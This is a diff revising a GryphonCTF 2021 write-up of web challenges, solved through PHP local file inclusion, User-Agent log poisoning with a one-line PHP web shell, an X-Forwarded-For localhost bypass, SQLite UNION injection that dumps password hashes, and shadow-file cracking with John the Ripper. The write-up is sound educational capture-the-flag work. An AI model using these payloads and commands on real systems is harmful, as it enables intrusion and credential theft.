@@ -1100,9 +1104,9 @@ nc c2.2021.gryphonctf.com 8001
 
 Hint: **Local**
 
-Local File Inclusion vulnerable in PHP
+By guessing from the challenge title and description, we can guess that this web challenge is about Local File Inclusion vulnerable in PHP.
 
-```php=
+```php
 Warning: Undefined array key "file" in /var/www/html/submit.php on line 2
 File Selected: /var/www/html/
 
@@ -1112,15 +1116,13 @@ Warning: include(/var/www/html): Failed to open stream: Not a directory in /var/
 Warning: include(): Failed opening '/var/www/html/' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/submit.php on line 4
 ```
 
-[PayloadAllTheThings PHP File inclusion payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)
-
-../../../../../../../../../../../../etc/passwd
+We can test this by going onto the website and submitting some common payload like ../../../../../../../../../../../../etc/passwd.
 
 <img src="https://i.imgur.com/fN0SBCB.png" width="100%" alt="">
 
-http://c2.2021.gryphonctf.com:9126/submit.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+According to [PayloadAllTheThings PHP File inclusion payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md), if the Apache server is vulnerable to LFI inside the include function you could try to access to /var/log/apache2/access.log, set inside the **user agent** or inside a GET parameter a php shell like `<?php system($_GET['c']); ?>` and execute code using the "c" GET parameter.
 
-> If the Apache server is vulnerable to LFI inside the include function you could try to access to /var/log/apache2/access.log, set inside the **user agent** or inside a GET parameter a php shell like `<?php system($_GET['c']); ?>` and execute code using the "c" GET parameter.
+We can try this out by setting using BrupSuite and setting our User-Agent to a HTTP Get parameter where we can input our malicious php code. With this, we can then list the files and directory of the webserver with ls. Then doing some simple enumarting, we can find the flag located at EqDtLyPnMCE8ZDKGyAoNbwfxZIRA/uhokwaQfzAiKLYCpoRzaZDnHFuIgmk/flag.txt.
 
 <img src="https://i.imgur.com/UA7tUKj.png" width="100%" alt="">
 
@@ -1130,48 +1132,35 @@ http://c2.2021.gryphonctf.com:9126/submit.php?file=..%2F..%2F..%2F..%2F..%2F..%2
 
 Description: The aliens have abducted the cow... can you help us find him?
 
-Save Cow.jpg
+![Internal Part 1](./internal_part1.png)
 
-Cow.jpg:
+This web challenge, we can see a login prompt and an image.
+
 <img src="https://i.imgur.com/tyAzgV8.jpg" width="100%" alt="">
 
-View the strings of the images
+By viewing the strings of the image, we can see a Base64 message as well as some werid string.
 
 <img src="https://i.imgur.com/9slmMBM.png" width="100%" alt="">
 
+Decoding the Base64 message with CyberChef we get the follow message.
 
-Comments = dmVyeXNlY3VyZXBhc3NwaHJhc2U=
-Base64 = verysecurepassphrase
-
-Weird strings, googling it
-
-<img src="https://i.imgur.com/HXWt0kx.png" width="100%" alt="">
-
-Discovered that this string is used in Steghide
-
-Extract the hidden data
+```
+dmVyeXNlY3VyZXBhc3NwaHJhc2U=
+# verysecurepassphrase
+```
+For the weird strings, we can google it. We discovered that this string is used in Steghide. Thus, we can use the steghide tool to extract the hidden data with the passphrase we just retrieved.
 
 <img src="https://i.imgur.com/dZhHCZJ.png" width="100%" alt="">
 
-Found the login credentials
+Steghide extracted a text file, with the login credentials Meridius:HKw@8j$-cR
 
-Meridius:HKw@8j$-cR
-
-
-Error
+We can then return to the login page and login with the credential above. However, we were redirected to an error page as seen in the figure below.
 
 <img src="https://i.imgur.com/EGATdmb.png" width="100%" alt="">
 
-> Sorry this page can only be viewed internally, please try again!
-
-Googling how to view internal websites
-
-https://blog.itpro.tv/ctf-walkthrough-for-meandmygirlfriend-1/
-
-> What we accomplished was this. By adding localhost as the IP in the X-Forwarded-For header, it tricked the system into thinking that the originating IP was coming from the trusted/white-listed local machine.
+We can google on how to view internal websites, base of some poor website flaws. We discoved that by adding localhost as the IP in the X-Forwarded-For header, it tricked the system into thinking that the originating IP was coming from the trusted/white-listed local machine.
 
 <img src="https://i.imgur.com/kiInt7p.png" width="100%" alt="">
-
 
 Flag: GCTF{4113n\_48duc71n9\_c0w5}
 
@@ -1182,7 +1171,9 @@ Flag: GCTF{4113n\_48duc71n9\_c0w5}
 Description: A friend is starting an online platform for learning about SQL and we have been invited as beta testers. Let's see if we can exploit anything.
 nc c2.2021.gryphonctf.com 8002
 
-SQL Injection Attack
+By judging from the challenge title and descrption, we can guess that this challenge revolves around SQL injection vulnerability.
+
+We can start off by perfoming a simple SQL injection attack with the following payload below.
 
 ```sql
 ' OR 1=1; -- -
@@ -1190,51 +1181,50 @@ SQL Injection Attack
 
 <img src="https://i.imgur.com/uJxJFTe.png" width="100%" alt="">
 
-
-IDENTIFY SQL Database Type
+Simple enough, we gained access and move onto the next page. Before we can perform more advanced SQL injection attack, we first need to identify the SQL Database type. You can use [PayloadsAllThings DMBS identification](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification). The following payload worked which means that the database is SQLite.
 
 ```sql
 ' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 ```
 
-SQLLite Database
+As it returns us the version number by sending an SQLite comamnd, we can infer that it is a SQLite database.
 
 <img src="https://i.imgur.com/lEwafPo.png" width="100%" alt="">
 
-
-Enmurate Tables
+After knowing the database type, we can enmurate the tables in the database by using the following payload below.
 
 ```sql
 ' UNION SELECT 1, tbl_name FROM sqlite_master;-- -
 ```
 
+We can see there are two tables, user and workshop. We can then enumerate the columns name of each table.
+
 <img src="https://i.imgur.com/1Wflz5K.png" width="100%" alt="">
 
-
-Columns
-
-<img src="https://i.imgur.com/9gFDOBo.png" width="100%" alt="">
+To enumerate the columns, we can use the following payload to describe how the table was created.
 
 ```sql
 ' UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name = 'user' AND type = 'table'; -- -
 ```
+
+<img src="https://i.imgur.com/9gFDOBo.png" width="100%" alt="">
+
+We can then retrieve the users in the user table with the following payload below.
+
 ```sql
-CREATE TABLE user (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password_sha256 TEXT, about TEXT)
+' UNION SELECT username, password_sha256 FROM user; -- -
 ```
 
-admin: c499244afdc389678cb2273a31fed27655e86a42a6f1fa2fdb112f73da8a5acb
+This gave us the username and the hashed password.
+
+admin:c499244afdc389678cb2273a31fed27655e86a42a6f1fa2fdb112f73da8a5acb
 joe:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
 
 <img src="https://i.imgur.com/5yZpNrH.png" width="100%" alt="">
 
 By using [CrackStation](https://crackstation.net/), we were able to retrieve the plaintext of these hashes.
 
-admin:admin1987
-joe:password123
-
-```sql
-CREATE TABLE workshop (id INTEGER PRIMARY KEY, title TEXT UNIQUE, description TEXT)
-```
+Afterwards, we can go back to the login page and login as the admin user. It will redirect us to the admin page with the flag.
 
 <img src="https://i.imgur.com/hUfRPEt.png" width="100%" alt="">
 
@@ -1244,27 +1234,45 @@ Flag: GCTF{SQLi\_and\_b4D\_p4s5wdS}
 
 ### [Web] Windows is da best
 
-Description: Our website has been hacked and those Linux punks have modified our website. They've planted information and think they're smart with their hiding skills. Show them who's boss.. o7
+Description: Our website has been hacked and those Linux punks have modified our website. They've planted information and think they're smart with their hiding skills. Show them who's boss..
 
 <img src="https://i.imgur.com/MCstbaD.png" width="100%" alt="">
 
+On the website, we can see a login prompt as well as a few images. This is a little tricky and easy to miss but the SP Logo is named as metadata.png. We can guess a message is hidden in the metadata of the image.
 
-https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-login-bruteforce-http-post-csrf.py
+<p align="center">
+    <img src="https://i.imgur.com/zRzvlKp.png" width="50%" height="50%" alt="metadata">
+</p>
 
-<img src="https://i.imgur.com/GZD1SdJ.png" width="100%" alt="">
+By viewing the metadata of the image, we can see that the software and user comment seem to be encoded in Base64.
 
-http://c1.2021.gryphonctf.com:9010/IN
+<img src="https://i.imgur.com/kK72ALW.png" width="100%" alt="">
 
+Base64 decoding both text returns us the following message:
 
-/etc/shadow
-/etc/passwd
+```
+U2VjcmV0IEtleSA9IExpbnV4Pw==
+# Secret Key = Linux?
 
-Follow https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
+L2V0Yy9wYXNzd2Q=
+# /etc/passwd
+```
+
+We can then guess that the passwd file is in the web server root for some reason, http://c1.2021.gryphonctf.com:9010/etc/passwd. The shadow file with the hashes can also be found in the web root /etc/shadow.
+
+With this two files, we can then crack the passwords with John the Ripper. First we need to use the utility called unshadow to combine the passwd and shadow file into a format that John can read. Then we can feed it to JohnTheRipper to do some cracking.
+
+```bash
+unshadow passwd shadow > passwords.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+```
 
 <img src="https://i.imgur.com/Ysvkmdf.png" width="100%" alt="">
 
+We obtained many password, we can try logging in on the website with the root credential.
 
-```plaintext=
+```plaintext
 root:123abc:0:0:root:/root:/bin/bash
 mail:picasso:8:8:mail:/var/mail:/bin/sh
 news:tanner:9:9:news:/var/spool/news:/bin/sh
@@ -1305,17 +1313,10 @@ josh:raymond:1055:1055::/home/josh:/bin/sh
 36 password hashes cracked, 1 left
 ```
 
-Logined as root
+After logging as root, we can see the first part of the flag. The next part is the password that we found previous in the metadata of the SP Logo. The password is "Linux?".
 
 <img src="https://i.imgur.com/yUGpawh.png" width="100%" alt="">
 
-Stego
-
-metadata.png
-<img src="https://i.imgur.com/zRzvlKp.png" width="100%" alt="metadata">
-
-<img src="https://i.imgur.com/kK72ALW.png" width="100%" alt="">
-
-Base64 decode:
+After inputting the password, we get the complete flag.
 
 Flag: GCTF{h0w\_d1d\_y0u\_f1nD\_m3??!??!@#$#}
